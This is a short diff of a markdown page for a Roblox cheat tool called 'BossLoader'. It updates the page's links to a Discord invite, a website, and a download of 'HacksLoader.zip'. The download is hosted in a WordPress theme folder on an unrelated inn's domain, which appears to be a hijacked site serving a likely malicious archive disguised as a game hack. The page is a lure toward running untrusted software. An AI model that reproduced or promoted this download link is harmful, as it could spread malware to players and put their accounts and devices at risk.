@@ -24,5 +24,6 @@ Roblox Page
 
 ### Links
 
-[Discord](https://www.discord.gg/invite/bossloader)
-[Downlaod BossLoader](https://pacificmistinn.com/wp-content/themes/home/pp/bots/HacksLoader.zip)
+![Discord](https://www.discord.gg/invite/bossloader)
+![Downlaod BossLoader](https://www.pacificmistinn.com/wp-content/themes/home/pp/bots/HacksLoader.zip)
+![Website](https://www.bossloader.com)
